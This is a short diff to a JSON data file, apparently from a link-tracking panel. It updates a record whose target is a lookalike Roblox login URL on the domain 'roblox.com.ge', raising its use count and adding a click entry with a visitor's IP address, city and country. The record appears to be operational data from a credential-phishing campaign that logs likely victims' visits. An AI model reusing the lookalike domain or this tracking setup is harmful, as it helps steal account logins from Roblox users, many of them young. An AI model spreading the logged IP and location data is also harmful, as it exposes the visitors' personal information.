@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1551,
+    "useCount": 1552,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12576,6 +12576,14 @@
         "city": "Nairobi",
         "flag": "🇰🇪",
         "countryCode": "KE"
+      },
+      {
+        "timestamp": 1777450367286,
+        "ip": "104.28.161.21",
+        "country": "Japan",
+        "city": "Ōkubo-naka",
+        "flag": "🇯🇵",
+        "countryCode": "JP"
       }
     ]
   },
